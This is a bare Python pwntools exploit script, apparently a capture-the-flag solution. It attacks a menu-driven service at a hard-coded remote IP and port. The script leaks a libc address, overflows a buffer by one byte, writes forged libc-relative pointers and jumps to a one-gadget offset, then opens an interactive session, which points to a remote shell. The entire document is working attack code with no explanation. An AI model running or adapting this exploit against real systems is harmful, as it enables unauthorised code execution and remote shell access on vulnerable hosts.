from pwn import *

#s = remote('192.168.33.10',1234)
s = remote('47.75.189.102', 9999)
raw_input()
s.recvuntil('>')
s.sendline('1')
s.recvuntil('>')
s.sendline('6')
libc = int(s.recvuntil('>')[-1-14:-1],16) - 0x6f690
print hex(libc)
s.sendline('2')
s.send("A"*0x18+p8(0x58))
s.recvuntil('>')
s.sendline('4')
s.recvuntil('>')
s.sendline('1')
s.recvuntil('size:')
s.sendline('300')
s.recvuntil('>')
s.sendline('4')
s.recvuntil('>')
s.sendline('3')
s.recvuntil('>')
s.sendline('4')
s.recvuntil('>')
s.sendline('2')
dat = "A"*0x18
dat += p64(libc+0x3c67a8)
dat += p64(libc+0x3c5620) + p64(0)
dat += p64(libc+0x3c48e0) + p64(0)
dat += '\x00'*(0x100-len(dat))
s.sendline(dat)
s.recvuntil('>')
s.sendline('4')
s.recvuntil('>')
s.sendline('2')
s.send(p64(libc+0x4526a))
s.interactive()
